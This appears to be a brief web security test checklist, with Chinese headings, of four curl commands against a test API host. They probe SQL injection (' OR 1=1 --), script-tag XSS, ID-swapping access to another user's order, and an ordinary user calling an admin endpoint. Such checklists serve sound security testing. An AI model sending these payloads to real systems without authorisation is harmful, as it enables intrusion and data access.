# 1. SQL注入
curl "http://test-api.example.com/api/search?q=' OR 1=1 --"

# 2. XSS
curl "http://test-api.example.com/api/search?q=<script>alert(1)</script>"

# 3. 水平越权（改ID）
curl "http://test-api.example.com/api/order/101" -H "Authorization: Bearer [你的Token]"

# 4. 垂直越权（普通用户调管理员接口）
curl "http://test-api.example.com/api/admin/users" -H "Authorization: Bearer [普通用户Token]"
